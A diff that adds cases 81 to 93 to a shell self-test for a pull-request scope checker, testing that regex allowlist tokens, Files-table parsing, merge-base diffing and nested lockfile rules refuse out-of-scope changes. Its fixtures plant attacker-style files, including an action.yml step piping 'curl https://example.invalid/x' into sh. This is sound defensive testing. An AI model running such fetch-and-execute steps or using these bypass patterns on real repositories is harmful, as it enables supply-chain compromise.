+printf '#!/bin/sh\necho attacker-controlled\n' > "$D81/.github/workflows/helper.sh"
+commit_all "$D81" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (.github/workflows, extension token): .github/workflows/helper.sh must be refused =="
+OUT81="$(run_scope "$D81")" && RC81=0 || RC81=$?
+if [ "$RC81" -eq 0 ]; then
+  echo "FAIL: case 81 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT81" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT81" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: .github/workflows/helper.sh was reported EXEMPT. Got:"
+  echo "$OUT81" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT81" | grep -qF '.github/workflows/helper.sh'; then
+  echo "FAIL: refused, but .github/workflows/helper.sh was not named among the offending paths. Got:"
+  echo "$OUT81" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a non-YAML file inside .github/workflows is refused (pins the extension token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 82. BOT_ALLOWED sweep, \.github/workflows/[^/]+\.ya?ml, filename/depth
+#     token (round seven's D03, re-verified). Widening `[^/]+\.ya?ml` to
+#     `.+` lets the single-component boundary be crossed: a nested
+#     subdirectory under workflows/ must still be refused.
+# ---------------------------------------------------------------------------
+D82="$WORK/bot-allowed-a6-depth-token"
+new_repo "$D82"
+mkdir -p "$D82/.github/workflows"
+commit_all "$D82" base
+git -C "$D82" checkout -qb pr
+mkdir -p "$D82/.github/workflows/nested"
+printf 'name: deploy\non: push\njobs: {}\n' > "$D82/.github/workflows/nested/deploy.yml"
+commit_all "$D82" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (.github/workflows, depth token): .github/workflows/nested/deploy.yml must be refused =="
+OUT82="$(run_scope "$D82")" && RC82=0 || RC82=$?
+if [ "$RC82" -eq 0 ]; then
+  echo "FAIL: case 82 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT82" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT82" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: .github/workflows/nested/deploy.yml was reported EXEMPT. Got:"
+  echo "$OUT82" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT82" | grep -qF '.github/workflows/nested/deploy.yml'; then
+  echo "FAIL: refused, but .github/workflows/nested/deploy.yml was not named among the offending paths. Got:"
+  echo "$OUT82" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a YAML file nested under a subdirectory of .github/workflows is refused (pins the single-component boundary)"
+fi
+
+# ---------------------------------------------------------------------------
+# 83. BOT_ALLOWED sweep, \.github/workflows/[^/]+\.ya?ml, "workflows"
+#     directory token (round seven's B13, re-verified). Widening (or
+#     dropping) the literal `workflows` component admits a YAML file
+#     anywhere under .github, not only inside the workflows directory.
+# ---------------------------------------------------------------------------
+D83="$WORK/bot-allowed-a6-dir-token"
+new_repo "$D83"
+mkdir -p "$D83/.github"
+commit_all "$D83" base
+git -C "$D83" checkout -qb pr
+mkdir -p "$D83/.github/actions/setup"
+printf 'name: setup\nruns:\n  using: composite\n  steps:\n    - run: curl https://example.invalid/x | sh\n' > "$D83/.github/actions/setup/action.yml"
+commit_all "$D83" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (.github/workflows, dir token): .github/actions/setup/action.yml must be refused =="
+OUT83="$(run_scope "$D83")" && RC83=0 || RC83=$?
+if [ "$RC83" -eq 0 ]; then
+  echo "FAIL: case 83 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT83" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT83" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: .github/actions/setup/action.yml was reported EXEMPT. Got:"
+  echo "$OUT83" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT83" | grep -qF '.github/actions/setup/action.yml'; then
+  echo "FAIL: refused, but .github/actions/setup/action.yml was not named among the offending paths. Got:"
+  echo "$OUT83" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a YAML file under .github but outside workflows/ is refused (pins the workflows-dir token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 84. BOT_ALLOWED sweep, \.github/dependabot\.yml, name token (round seven's
+#     D02, re-verified). Widening the literal `dependabot` component to
+#     `[^/]+` admits any YAML file directly under .github.
+# ---------------------------------------------------------------------------
+D84="$WORK/bot-allowed-a7-name-token"
+new_repo "$D84"
+mkdir -p "$D84/.github"
+commit_all "$D84" base
+git -C "$D84" checkout -qb pr
+printf 'not dependabot config\n' > "$D84/.github/other.yml"
+commit_all "$D84" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (.github/dependabot.yml, name token): .github/other.yml must be refused =="
+OUT84="$(run_scope "$D84")" && RC84=0 || RC84=$?
+if [ "$RC84" -eq 0 ]; then
+  echo "FAIL: case 84 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT84" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT84" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: .github/other.yml was reported EXEMPT. Got:"
+  echo "$OUT84" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT84" | grep -qF '.github/other.yml'; then
+  echo "FAIL: refused, but .github/other.yml was not named among the offending paths. Got:"
+  echo "$OUT84" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a YAML file directly under .github that is not literally dependabot.yml is refused (pins the name token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 85. BOT_ALLOWED sweep, \.github/dependabot\.yml, extension token. Unlike
+#     the workflows alternative this one has no `ya?ml` alternation at all,
+#     just a fixed literal extension; widening it to `\..*` admits any file
+#     literally named "dependabot" under .github, whatever its extension.
+# ---------------------------------------------------------------------------
+D85="$WORK/bot-allowed-a7-ext-token"
+new_repo "$D85"
+mkdir -p "$D85/.github"
+commit_all "$D85" base
+git -C "$D85" checkout -qb pr
+printf '#!/bin/sh\necho attacker-controlled\n' > "$D85/.github/dependabot.sh"
+commit_all "$D85" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (.github/dependabot.yml, extension token): .github/dependabot.sh must be refused =="
+OUT85="$(run_scope "$D85")" && RC85=0 || RC85=$?
+if [ "$RC85" -eq 0 ]; then
+  echo "FAIL: case 85 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT85" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT85" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: .github/dependabot.sh was reported EXEMPT. Got:"
+  echo "$OUT85" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT85" | grep -qF '.github/dependabot.sh'; then
+  echo "FAIL: refused, but .github/dependabot.sh was not named among the offending paths. Got:"
+  echo "$OUT85" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a file named dependabot but not ending in .yml is refused (pins the extension token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 86. BOT_ALLOWED sweep, packages/[^/]+/package(-lock)?\.json, filename
+#     token. Widening the literal `package(-lock)?` component to `[^/]+`
+#     admits any JSON file inside a package directory.
+# ---------------------------------------------------------------------------
+D86="$WORK/bot-allowed-a8-filename-token"
+new_repo "$D86"
+mkdir -p "$D86/packages/dashboard"
+commit_all "$D86" base
+git -C "$D86" checkout -qb pr
+printf '{"not":"package.json"}\n' > "$D86/packages/dashboard/malicious.json"
+commit_all "$D86" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (packages/.../package.json, filename token): packages/dashboard/malicious.json must be refused =="
+OUT86="$(run_scope "$D86")" && RC86=0 || RC86=$?
+if [ "$RC86" -eq 0 ]; then
+  echo "FAIL: case 86 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT86" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT86" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: packages/dashboard/malicious.json was reported EXEMPT. Got:"
+  echo "$OUT86" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT86" | grep -qF 'packages/dashboard/malicious.json'; then
+  echo "FAIL: refused, but packages/dashboard/malicious.json was not named among the offending paths. Got:"
+  echo "$OUT86" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a JSON file inside a package dir that is not literally package(-lock).json is refused (pins the filename token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 87. BOT_ALLOWED sweep, packages/[^/]+/package(-lock)?\.json, leading
+#     directory token. Widening the literal `packages` component to
+#     `[^/]+` admits a package.json under any top-level directory.
+# ---------------------------------------------------------------------------
+D87="$WORK/bot-allowed-a8-dir-token"
+new_repo "$D87"
+mkdir -p "$D87/vendor/dashboard"
+commit_all "$D87" base
+git -C "$D87" checkout -qb pr
+printf '{"name":"dashboard","version":"0.1.0"}\n' > "$D87/vendor/dashboard/package.json"
+commit_all "$D87" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (packages/.../package.json, dir token): vendor/dashboard/package.json must be refused =="
+OUT87="$(run_scope "$D87")" && RC87=0 || RC87=$?
+if [ "$RC87" -eq 0 ]; then
+  echo "FAIL: case 87 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT87" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT87" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: vendor/dashboard/package.json was reported EXEMPT. Got:"
+  echo "$OUT87" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT87" | grep -qF 'vendor/dashboard/package.json'; then
+  echo "FAIL: refused, but vendor/dashboard/package.json was not named among the offending paths. Got:"
+  echo "$OUT87" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a package.json under a non-packages top directory is refused (pins the leading dir token)"
+fi
+
+# ---------------------------------------------------------------------------
+# 88. BOT_ALLOWED sweep, packages/[^/]+/package(-lock)?\.json, depth token.
+#     Widening the `[^/]+` package-name component to `.+` would let a
+#     package.json under a nested subdirectory ride the alternative.
+# ---------------------------------------------------------------------------
+D88="$WORK/bot-allowed-a8-depth-token"
+new_repo "$D88"
+mkdir -p "$D88/packages/dashboard"
+commit_all "$D88" base
+git -C "$D88" checkout -qb pr
+mkdir -p "$D88/packages/dashboard/nested"
+printf '{"name":"nested","version":"0.1.0"}\n' > "$D88/packages/dashboard/nested/package.json"
+commit_all "$D88" attack
+fake_gh 'dependabot[bot]' ''
+echo "== BOT_ALLOWED sweep (packages/.../package.json, depth token): packages/dashboard/nested/package.json must be refused =="
+OUT88="$(run_scope "$D88")" && RC88=0 || RC88=$?
+if [ "$RC88" -eq 0 ]; then
+  echo "FAIL: case 88 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT88" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT88" | grep -qF 'pr-scope-check: EXEMPT'; then
+  echo "FAIL: packages/dashboard/nested/package.json was reported EXEMPT. Got:"
+  echo "$OUT88" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT88" | grep -qF 'packages/dashboard/nested/package.json'; then
+  echo "FAIL: refused, but packages/dashboard/nested/package.json was not named among the offending paths. Got:"
+  echo "$OUT88" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a package.json nested a level deeper than the allowlisted single component is refused (pins the depth token)"
+fi
+
+# ===========================================================================
+# SHOULD_FIX findings from round seven, addressed directly rather than
+# deferred.
+# ---------------------------------------------------------------------------
+
+# ---------------------------------------------------------------------------
+# 89. SHOULD_FIX: the three-dot merge-base rule (line 115-137's own 23 lines
+#     of prose, issue #535) is the most heavily documented rule in the
+#     script and had no case pinning that MERGE_BASE, not BASE_SHA, is what
+#     the diff is actually computed against. `main` advances with an
+#     unrelated commit AFTER this PR branched; BASE_SHA is passed as that
+#     NEW tip (the real workflow always passes the current base branch
+#     head, not the commit this PR's branch point). A two-dot diff against
+#     BASE_SHA directly would show main's own later, unrelated file as
+#     "changed" by this PR (removed, from the PR's point of view) and blame
+#     it on this PR, reproducing the exact PR #512 incident the comment
+#     names.
+# ---------------------------------------------------------------------------
+D89="$WORK/mergebase-not-basesha-should-fix"
+new_repo "$D89"
+mkdir -p "$D89/src"
+printf 'orig\n' > "$D89/src/a.rs"
+printf '# Changelog\n' > "$D89/CHANGELOG.md"
+commit_all "$D89" base
+git -C "$D89" checkout -qb pr
+printf 'changed\n' > "$D89/src/a.rs"
+commit_all "$D89" implement
+HEAD89="$(git -C "$D89" rev-parse HEAD)"
+git -C "$D89" checkout -q main
+printf 'unrelated content, landed by a DIFFERENT pull request after this branch diverged\n' > "$D89/src/other_pr_landed.rs"
+commit_all "$D89" "unrelated PR merged into main"
+BASE89="$(git -C "$D89" rev-parse main)"
+fake_gh 'coder-agent' 'Closes #42' '## Files
+
+| Path | Action | Purpose |
+| --- | --- | --- |
+| `src/a.rs` | modify | the only file this PR touches |
+'
+echo "== the three-dot merge-base rule: BASE_SHA must not be diffed against directly once main has advanced =="
+OUT89="$(run_scope "$D89" "$BASE89" "$HEAD89")" && RC89=0 || RC89=$?
+if [ "$RC89" -ne 0 ]; then
+  echo "FAIL: case 89 was expected to pass (rc=0) but exited non-zero (rc=$RC89). If this fails, the" >&2
+  echo "diff was likely computed against BASE_SHA directly (a two-dot diff) instead of the merge" >&2
+  echo "base, and main's own later, unrelated commit is being blamed on this PR (issue #535's" >&2
+  echo "exact incident, and the real PR #512 it names). Got:" >&2
+  echo "$OUT89" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT89" | grep -qF 'pr-scope-check: the diff matches issue #42'; then
+  note "the diff is computed against the merge base, not BASE_SHA directly; main's later unrelated commit is not blamed on this PR"
+else
+  echo "FAIL: a PR whose only real change is declared was refused, most likely because the diff" >&2
+  echo "was computed against BASE_SHA instead of the merge base. Got:" >&2
+  echo "$OUT89" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+
+# ---------------------------------------------------------------------------
+# 90. SHOULD_FIX: the Files-table parser's heading-exactness rule. The issue
+#     body contains a SECOND section, `## Do not touch these files`, whose
+#     own markdown table backticks a path in its first cell. That heading
+#     does not start with "## files" and must not turn its table into
+#     declared scope; a widened `"files" in s.lower()` match would.
+# ---------------------------------------------------------------------------
+D90="$WORK/files-heading-exactness-should-fix"
+new_repo "$D90"
+mkdir -p "$D90/src"
+printf 'orig\n' > "$D90/src/a.rs"
+printf 'orig secret\n' > "$D90/src/secrets.rs"
+commit_all "$D90" base
+git -C "$D90" checkout -qb pr
+printf 'changed\n' > "$D90/src/a.rs"
+printf 'changed secret\n' > "$D90/src/secrets.rs"
+commit_all "$D90" implement
+fake_gh 'coder-agent' 'Closes #42' '## Files
+
+| Path | Action | Purpose |
+| --- | --- | --- |
+| `src/a.rs` | modify | the only file this PR should touch |
+
+## Do not touch these files
+
+| Path | Reason |
+| --- | --- |
+| `src/secrets.rs` | out of scope, never edit this file |
+'
+echo "== Files-table heading exactness: a 'Do not touch these files' table must never be read as declared scope =="
+OUT90="$(run_scope "$D90")" && RC90=0 || RC90=$?
+if [ "$RC90" -eq 0 ]; then
+  echo "FAIL: case 90 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT90" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT90" | grep -qF 'pr-scope-check: the diff matches issue'; then
+  echo "FAIL: src/secrets.rs, listed only under a 'Do not touch' heading, was treated as declared. Got:"
+  echo "$OUT90" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT90" | grep -qF 'src/secrets.rs'; then
+  echo "FAIL: refused, but src/secrets.rs was not named among the undeclared paths. Got:"
+  echo "$OUT90" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a 'Do not touch these files' section's own table is never read as declared scope"
+fi
+
+# ---------------------------------------------------------------------------
+# 91. SHOULD_FIX: the Files-table parser's table-row restriction
+#     (`not s.startswith("|")`). A backticked path sitting in a PROSE
+#     sentence under `## Files`, not inside a table row, must not be read
+#     as a declared path either.
+# ---------------------------------------------------------------------------
+D91="$WORK/files-row-restriction-should-fix"
+new_repo "$D91"
+mkdir -p "$D91/src"
+printf 'orig\n' > "$D91/src/a.rs"
+printf 'orig secret\n' > "$D91/src/secrets.rs"
+commit_all "$D91" base
+git -C "$D91" checkout -qb pr
+printf 'changed\n' > "$D91/src/a.rs"
+printf 'changed secret\n' > "$D91/src/secrets.rs"
+commit_all "$D91" implement
+fake_gh 'coder-agent' 'Closes #42' '## Files
+
+Do NOT touch `src/secrets.rs` under any circumstances.
+
+| Path | Action | Purpose |
+| --- | --- | --- |
+| `src/a.rs` | modify | the only file this PR should touch |
+'
+echo "== Files-table row restriction: a backticked path in PROSE under ## Files must not be read as a declared row =="
+OUT91="$(run_scope "$D91")" && RC91=0 || RC91=$?
+if [ "$RC91" -eq 0 ]; then
+  echo "FAIL: case 91 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT91" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT91" | grep -qF 'pr-scope-check: the diff matches issue'; then
+  echo "FAIL: src/secrets.rs, named only in a prose warning sentence, was treated as declared. Got:"
+  echo "$OUT91" | sed 's/^/    /'
+  FAILED=1
+elif ! echo "$OUT91" | grep -qF 'src/secrets.rs'; then
+  echo "FAIL: refused, but src/secrets.rs was not named among the undeclared paths. Got:"
+  echo "$OUT91" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a backticked path in prose under ## Files is never read as a declared table row"
+fi
+
+# ---------------------------------------------------------------------------
+# 92. SHOULD_FIX: the Files-table parser's header/separator skip
+#     (`path.lower() == "path" or set(path) <= set("-: ")`). A malformed but
+#     plausible table backticks its own header cell (`` | `Path` | Action
+#     | ``); that must still be skipped, not read as declaring a file
+#     literally named "Path".
+# ---------------------------------------------------------------------------
+D92="$WORK/files-header-skip-should-fix"
+new_repo "$D92"
+mkdir -p "$D92/src"
+printf 'orig\n' > "$D92/src/a.rs"
+commit_all "$D92" base
+git -C "$D92" checkout -qb pr
+printf 'changed\n' > "$D92/src/a.rs"
+printf 'a real, tracked file literally named Path, not a header row\n' > "$D92/Path"
+commit_all "$D92" implement
+fake_gh 'coder-agent' 'Closes #42' '## Files
+
+| `Path` | Action | Purpose |
+| --- | --- | --- |
+| `src/a.rs` | modify | the only real declared file |
+'
+echo "== Files-table header skip: a backticked table header must not declare a file literally named Path =="
+OUT92="$(run_scope "$D92")" && RC92=0 || RC92=$?
+if [ "$RC92" -eq 0 ]; then
+  echo "FAIL: case 92 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT92" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT92" | grep -qF 'pr-scope-check: the diff matches issue'; then
+  echo "FAIL: a file literally named 'Path' was treated as declared by the table's own (backticked)" >&2
+  echo "header row. Got:" >&2
+  echo "$OUT92" | sed 's/^/    /' >&2
+  FAILED=1
+elif ! echo "$OUT92" | grep -qE '^ {4}Path$'; then
+  echo "FAIL: refused, but the file named 'Path' was not clearly named among the undeclared paths. Got:"
+  echo "$OUT92" | sed 's/^/    /'
+  FAILED=1
+else
+  note "a backticked table header ('Path') is skipped, not read as declaring a file literally named Path"
+fi
+
+# ---------------------------------------------------------------------------
+# 93. SHOULD_FIX: the root-vs-nested lockfile exemption boundary
+#     (`[ "$f" = "Cargo.lock" ]`, line 804, deliberately an EXACT match on
+#     the ROOT lockfile only). A DIFFERENT crate's declared, changed
+#     manifest sets cargo_lock_exempt=1; an UNRELATED crate's nested
+#     Cargo.lock, whose own sibling manifest is neither declared nor
+#     touched, must not ride that flag. This is the non-bot path's own
+#     cargo_lock_exempt loop (lines 784-798), independent of BOT_ALLOWED.
+# ---------------------------------------------------------------------------
+D93="$WORK/nested-lockfile-boundary-should-fix"
+new_repo "$D93"
+mkdir -p "$D93/crates/a" "$D93/crates/b/fuzz"
+printf '[package]\nname="a"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D93/crates/a/Cargo.toml"
+printf '[package]\nname="b-fuzz"\nversion="0.0.0"\npublish=false\n\n[dependencies]\nlibfuzzer-sys="0.4"\n' > "$D93/crates/b/fuzz/Cargo.toml"
+printf 'placeholder\n' > "$D93/crates/b/fuzz/Cargo.lock"
+commit_all "$D93" base
+git -C "$D93" checkout -qb pr
+printf '[package]\nname="a"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D93/crates/a/Cargo.toml"
+printf 'attacker-controlled content, no declared sibling ties it to anything reviewed\n' > "$D93/crates/b/fuzz/Cargo.lock"
+commit_all "$D93" implement
+fake_gh 'coder-agent' 'Closes #42' '## Files
+
+| Path | Action | Purpose |
+| --- | --- | --- |
+| `crates/a/Cargo.toml` | modify | bump serde in crate a, unrelated to crate b |
+'
+echo "== nested lockfile exemption boundary: an unrelated crate's nested Cargo.lock must not ride a DIFFERENT crate's declared bump =="
+OUT93="$(run_scope "$D93")" && RC93=0 || RC93=$?
+if [ "$RC93" -eq 0 ]; then
+  echo "FAIL: case 93 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
+  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
+  echo "(round six's own finding). Got:" >&2
+  echo "$OUT93" | sed 's/^/    /' >&2
+  FAILED=1
+fi
+if echo "$OUT93" | grep -qF 'pr-scope-check: the diff matches issue'; then
+  echo "FAIL: crates/b/fuzz/Cargo.lock, whose own sibling manifest is neither declared nor touched," >&2
+  echo "rode crate a's unrelated declared bump. Got:" >&2
+  echo "$OUT93" | sed 's/^/    /' >&2
+  FAILED=1
+elif ! echo "$OUT93" | grep -qF 'crates/b/fuzz/Cargo.lock'; then
+  echo "FAIL: refused, but crates/b/fuzz/Cargo.lock was not named among the undeclared paths. Got:"
+  echo "$OUT93" | sed 's/^/    /'
+  FAILED=1
+else
+  note "an unrelated crate's nested lockfile does not ride a different crate's declared manifest bump"
+fi
+
 # 47. Each of the three required environment variables must fail this script
 #     CLOSED (rc=1, with its own message) when unset, checked by EXIT CODE,
 #     not merely by scanning the text for something that looks like a
@@ -3266,43 +4305,23 @@ else
 fi
 
 echo
-# Vacuity guard (round seven, SHOULD_FIX). This file currently makes 73
-# `run_scope` calls plus 3 case-47 guards checked directly: 76, EXACTLY, is
-# the floor, deliberately tight rather than "comfortably beneath" -- round
-# six's own review found that deleting a SINGLE case (46b) still reported
-# "clean", and a loose floor set safely below the total would not have
-# caught that either. An exact floor means the next round that legitimately
-# adds or removes a case MUST update this number in the same commit, which
-# is the point: a silent case loss becomes a loud, must-fix build failure
-# instead of a number nobody had to look at.
-#
-# WATCHED TO FIRE, both ways, directly against this file (not merely
-# reasoned about): (b) deleting every case from case 2 through the end
-# leaves CASES at 1, this guard fires, rc=1, before `$FAILED` is even
-# consulted. (d) deleting case 46b alone (the round-six regression this
-# guard exists to catch) leaves CASES at 75, one short of the floor, and
-# this guard fires. NOT caught, and provably CANNOT be caught by anything
-# placed later in this same linear script: an `exit 0` inserted before case
-# 1 (experiment (a) in the round-seven review) terminates the script before
-# this code is ever reached at all, the same way it terminates every case
-# after it. `wc -c` on `$CASES_FILE` at that point would read 0, but the
-# process has already exited 0 three thousand lines earlier; no assertion
-# placed after an unconditional early exit can run. Closing (a) needs an
-# external check (the CI step, or a wrapper, asserting the literal string
-# "pr-scope-check-selftest: clean" appears in this script's OWN stdout, not
-# merely that its exit code was 0), which is a change to ci.yml, not to this
-# file, and is out of scope for a script-logic freeze. This guard closes (b)
-# and (d); it does not, and structurally cannot, close (a) from inside this
-# file.
-CASES="$(wc -c < "$CASES_FILE" | tr -d ' ')"
-CASES_FLOOR=76
-if [ "$CASES" -lt "$CASES_FLOOR" ]; then
-  echo "pr-scope-check-selftest: FAILED. Only $CASES case(s) actually ran (expected at least" >&2
-  echo "$CASES_FLOOR). A self-test that runs (almost) nothing, or silently drops one of its own" >&2
-  echo "cases, must not report success for having found nothing." >&2
-  exit 1
-fi
-note "$CASES case(s) actually ran (floor $CASES_FLOOR)"
+# Vacuity guard verdict (round seven, hardened round eight). The actual
+# floor enforcement (CASES_FLOOR and the "did we even get this far" check)
+# now lives entirely in the `_finish` EXIT trap installed at the top of this
+# file, which is the fix for round seven's own finding that a check placed
+# only HERE, after every case, cannot see an early `exit 0` that never lets
+# execution reach this point at all. This block's only remaining job is to
+# report the count for a human reading the log, and to set `DONE=1`, the
+# single flag the trap requires before it will treat this run as anything
+# other than a vacuous or early exit. `DONE=1` is set on BOTH the clean path
+# and the ordinary case-failure path below, deliberately: reaching this
+# point at all, with $FAILED evaluated either way, means the suite actually
+# ran its own accounting rather than being cut short, so the trap should
+# relay this script's own explicit exit status rather than override it with
+# a "vacuous" message that would be true of the exit code and false of the
+# reason.
+note "$(wc -c < "$CASES_FILE" | tr -d ' ') case(s) actually ran (floor $CASES_FLOOR)"
+DONE=1
 if [ "$FAILED" -ne 0 ]; then
   echo "pr-scope-check-selftest: FAILED. The scope check no longer enforces what it claims."
   exit 1
